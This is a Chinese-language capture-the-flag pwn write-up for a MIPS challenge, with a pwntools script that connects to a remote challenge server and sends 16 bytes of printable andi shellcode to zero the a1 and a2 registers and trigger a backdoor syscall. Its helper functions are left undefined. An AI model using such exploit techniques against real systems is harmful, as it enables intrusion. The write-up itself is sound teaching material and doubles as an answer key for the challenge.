# sigin_shellcode

> 分类：Pwn

## 题目描述

MIPS 架构，可控 16 字节 shellcode，后门函数已经完成后续 syscall 及参数设置，需用可打印字符范围的 shellcode 将 a1、a2 寄存器置零。

## 考察知识点

- MIPS shellcode
- 可打印字符 shellcode

## 解法

MIPS 架构，可控 16 字节 shellcode。后门函数已完成后续 syscall 和参数设置，需要用可打印字符范围的 shellcode 将 a1、a2 寄存器置零。

```python
from pwn import *

context.arch = 'mips'
sh = remote('47.94.224.3', 18154)

# 通过猜数字攒金币
for i in range(99):
    getCoins()

getAttack('3')
getAttack('2')

# 用 andi 将 a1、a2 置零（可打印字符）
payload = asm('andi $a2, $t2, 0x2222') + asm('andi $a1, $t2, 0x2222') * 3

getCoins()
sla('>', payload)
ti()
```

## 参考答案

（flag 通过 MIPS 可打印 shellcode 置零寄存器后触发后门 syscall 读取）

## 来源

- 作者：C4oy1Zz | https://cn-sec.com/archives/1802791.html
